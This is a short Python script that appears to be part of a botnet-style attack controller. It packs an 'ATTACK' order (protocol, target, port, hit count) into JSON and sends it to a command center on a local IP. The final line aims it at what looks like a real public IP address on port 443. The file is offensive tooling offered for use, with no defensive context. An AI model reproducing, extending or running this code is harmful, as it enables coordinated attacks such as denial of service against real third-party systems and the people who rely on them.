import socket
import json



def send_data_to_agents(PROTOCOL, TARGET, PORT, HITS):   
    #send data too all agents in list
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            # Send attack message to Command Center
            attack_message = json.dumps({"ATTACK": {"PROTOCOL": f"{PROTOCOL}", "TARGET": f"{TARGET}", "PORT": f"{PORT}", "HITS": HITS}})
            # Connect to the command center and send the HB
            
            #s.connect((i[2], 8574))
            s.connect(("192.168.1.88", 8574))
            s.sendall(attack_message.encode())
            # close the connection
            s.close()

        except Exception as e:
            print(f"\033[1;31mERROR: Failed to send attack instructions to: ", e)


send_data_to_agents("TCP", "81.169.145.92", 443, 5)